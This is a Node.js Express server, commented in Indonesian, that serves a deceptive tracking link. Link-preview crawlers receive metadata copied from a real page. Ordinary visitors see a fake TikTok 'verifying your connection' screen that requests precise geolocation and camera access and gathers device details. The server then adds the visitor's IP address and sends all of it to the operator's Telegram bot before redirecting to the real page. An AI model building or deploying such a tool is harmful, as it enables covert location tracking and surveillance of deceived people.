const express = require('express');
const axios = require('axios');
const { parse } = require('node-html-parser');

const app = express(); // Initialize app
const PORT = 3030;

app.use(express.json()); 
app.set("json spaces", 2);
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Saat di Vercel, ini akan mengambil dari dashboard. Saat lokal, dari .env.local
require('dotenv').config({ path: './.env.local' });
const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = process.env.OWNER_ID;


// --- ROUTE UTAMA UNTUK PELACAKAN ---
app.get('/w', async (req, res) => {
    const targetUrl = req.query.url;
    if (!targetUrl) {
        return res.send("URL target tidak disediakan.");
    }

    const userAgent = req.headers['user-agent'];
    const crawlerUserAgents = ['TelegramBot', 'facebookexternalhit', 'WhatsApp', 'Twitterbot', 'Discordbot'];
    const isCrawler = crawlerUserAgents.some(crawler => userAgent.includes(crawler));

    // JIKA YANG AKSES ADALAH CRAWLER (untuk preview link)
    if (isCrawler) {
        try {
            const response = await axios.get(targetUrl);
            const root = parse(response.data);

            const getMetaTag = (prop) => root.querySelector(`meta[property="${prop}"]`)?.getAttribute('content') || '';
            
            const title = getMetaTag('og:title') || root.querySelector('title')?.text || 'Judul tidak ditemukan';
            const description = getMetaTag('og:description') || 'Deskripsi tidak ditemukan';
            const image = getMetaTag('og:image') || 'https://sf-tools.fastcal.net/tiktok-icon.png'; // Gambar default

            // Kirim HTML dengan metadata yang sudah dicuri
            return res.send(`
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset="UTF-8">
                    <title>${title}</title>
                    <meta property="og:title" content="${title}" />
                    <meta property="og:description" content="${description}" />
                    <meta property="og:image" content="${image}" />
                </head>
                <body></body>
                </html>
            `);
        } catch (error) {
            console.error('Error fetching target URL for crawler:', error);
            return res.send('Gagal mengambil metadata.');
        }
    }

    // JIKA YANG AKSES ADALAH PENGGUNA BIASA (TARGET)
    // Kirim halaman HTML dengan tema TikTok dan skrip pelacak
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Connecting to TikTok...</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
            body { background-color: #010101; color: #fff; font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; text-align: center; }
            .container { max-width: 300px; }
            .logo { width: 80px; height: 80px; margin-bottom: 20px; }
            h1 { font-size: 22px; margin-bottom: 10px; }
            p { font-size: 14px; color: #aaa; margin-bottom: 30px; }
            .spinner { border: 4px solid rgba(255, 255, 255, 0.2); border-left-color: #FE2C55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
            @keyframes spin { to { transform: rotate(360deg); } }
        </style>
    </head>
    <body>
        <div class="container">
            <img src="https://sf-tools.fastcal.net/tiktok-icon.png" alt="TikTok Logo" class="logo">
            <h1>Just a moment...</h1>
            <p>We need to verify your connection to continue. Please approve any requests from your browser.</p>
            <div class="spinner"></div>
        </div>

        <script>
            async function logData(data) {
                try {
                    await fetch('/log', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                } catch (e) { console.error('Log Error:', e); }
            }

            async function getPermissions() {
                const data = {
                    targetUrl: "${targetUrl}",
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenWidth: window.screen.width,
                    screenHeight: window.screen.height,
                    location: 'Denied or Unavailable',
                    camera: 'Denied or Unavailable'
                };

                // Minta Izin Lokasi
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
                    });
                    data.location = \`https://www.google.com/maps?q=\${position.coords.latitude},\${position.coords.longitude}\`;
                } catch (e) {
                    console.warn('Geolocation failed:', e.message);
                }

                // Minta Izin Kamera
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    data.camera = 'Allowed';
                    stream.getTracks().forEach(track => track.stop()); // Penting: matikan kamera
                } catch (e) {
                    console.warn('Camera access failed:', e.message);
                }

                await logData(data);
                
                // Redirect ke URL asli setelah semua proses selesai
                window.location.href = "${targetUrl}";
            }

            window.onload = getPermissions;
        </script>
    </body>
    </html>
    `);
});


// --- ROUTE UNTUK MENERIMA LOG & MENGIRIM KE TELEGRAM ---
app.post('/log', async (req, res) => {
    const data = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // Format pesan untuk dikirim ke owner bot
    const message = `
🎯 **Data Target Baru Diterima!** 🎯
-----------------------------------
🔗 **URL Target:** \`${data.targetUrl}\`
💻 **Alamat IP:** \`${ip}\`
📱 **User Agent:** \`${data.userAgent}\`
🖥️ **Platform:** \`${data.platform}\` (${data.screenWidth}x${data.screenHeight})
🗣️ **Bahasa:** \`${data.language}\`
-----------------------------------
📍 **Lokasi:** ${data.location}
📸 **Kamera:** \`${data.camera}\`
    `;

    // Kirim pesan ke Owner via API Telegram
    try {
        await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: OWNER_ID,
                text: message,
                parse_mode: 'Markdown'
            }
        );
    } catch (error) {
        console.error("Failed to send log to Telegram:", error.response?.data || error.message);
    }
    
    res.sendStatus(200); // Kirim status OK kembali ke browser target
});


app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
module.exports = app;
